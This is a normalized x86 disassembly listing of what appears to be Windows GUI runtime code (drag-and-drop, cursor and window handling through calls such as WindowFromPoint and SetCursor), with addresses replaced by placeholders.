mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_43f228
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43654c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403454
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43dd58
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_435d18
sub_4366ec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_413808
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_41369c
mov edx edi
mov eax [ rw-data ]
call sub_413650
jmp r-xdata
sub_43674c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_4367a4
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404450
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_4358ec
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_436804
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4367a4
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_436830
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_436590
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_436804
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43674c
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_43f228
mov [ esi ] eax
sub_436880
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43674c
cmp eax 0x1
sbb eax eax
inc eax
sub_4368bc
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_43dcc4
test eax eax
je r-xdata
mov eax esi
call sub_43dcc4
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_4372ec
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_4137ac
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413808
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_43dcd8
mov edi eax
jmp r-xdata
sub_436950
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_436830
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_440d08
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_436880
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_436880
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_438584
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_436880
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4564c8
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_440cf0
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_4368bc
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403454
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_440df0
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_440d08
jmp r-xdata
mov eax [ rw-data ]
call sub_440e64
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4564c8
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_438584
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403454
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403454
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407b14
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_436c20
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_435e4c
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_440d08
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_436950
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_436d90
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_436f35
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403454
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403454
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_436154
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_436c20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43603c
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_43f228
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412350
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_438558
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_412350
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_436f54
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403454
mov ebx eax
sub_436fc8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_437294
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_437222
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_435e94
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403408
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_436f54
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_436880
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_440e64
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437229
mov eax [ rw-data ]
call sub_403258
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_44f7bc
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_439bf4
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43674c
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_453428
sub_437229
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4033e4
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
sub_4372b8
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_435920
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_4372ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_4372b8
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_438584
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_43cb14
test eax eax
je r-xdata
mov esi eax
sub_437334
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_413650
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx ] eax
sub_43735c
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_4138f0
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403258
xor eax eax
mov [ ebx ] eax
sub_43737c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4373ac
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_413b18
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43745c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413b7c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_437435
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_4375e8
call sub_403a78
call sub_403a78
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4137ac
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41d2d4
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_437468
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413b18
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_437506
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43750d
mov eax [ rw-data ]
call sub_413b7c
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4374de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4375e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d330
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4137ac
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d2d4
test al al
je r-xdata
sub_437514
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
call sub_4375e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41cbc4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_437540
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d4b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41d4b8
mov eax [ ebp - 0x4 ]
call sub_437634
mov eax [ rw-data ]
call sub_413b18
mov ebx eax
xor eax eax
push ebp
push sub_4375c5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413b7c
retn
call sub_4373ac
sub_4375e8
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41d4b8
mov edx ebx
mov eax [ rw-data ]
call sub_413b2c
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_437634
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_439084
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_437660
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_43769c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413e34
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4376e4
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_4377a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43786d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
